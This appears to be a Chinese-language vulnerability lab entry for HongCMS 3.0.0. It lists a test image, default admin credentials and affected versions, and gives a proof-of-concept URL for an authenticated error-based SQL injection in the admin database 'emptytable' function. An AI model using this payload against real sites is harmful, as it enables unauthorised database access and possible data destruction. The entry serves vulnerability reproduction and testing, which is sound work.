## 环境说明

* 镜像src/hongcms/3.0.0

  * 后台地址

    http://127.0.0.1/admin

  * 账号/密码：admin/admin


## Hongcms 3.0.0后台SQL注入漏洞

测试镜像

- src/hongcms/3.0.0

影响版本

- HongCMS <= 3.0.0

参考链接

- [Hongcms 3.0.0后台SQL注入漏洞分析](http://www.freebuf.com/vuls/178316.html)

Poc

使用管理员账号admin/admin登录后台，访问url

```
http://172.17.0.2/admin/index.php/database/operate?dbaction=emptytable&tablename=hong_vvc`+where+vvcid%3d1+or+updatexml(2,concat(0x7e,(version())),0)+or+`
```
